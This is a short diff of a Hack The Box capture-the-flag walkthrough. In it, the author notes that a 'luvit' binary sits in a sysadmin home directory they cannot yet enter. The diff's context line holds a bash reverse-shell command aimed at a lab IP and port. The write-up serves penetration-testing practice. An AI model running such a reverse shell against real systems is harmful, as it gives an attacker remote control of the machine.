@@ -106,4 +106,9 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.4/1337 0>&1'
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2a27e9b7-5e5d-4ad5-9b8c-70f7baa8668c)
 
 
-17. 
+17. Remembering the **luvit** binary is inside the **sysadmin** home directory, we need to traverse there, but currently we are denied.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c7ab4b96-ae8f-45df-8825-c177f4ff3123)
+
+
+18. 
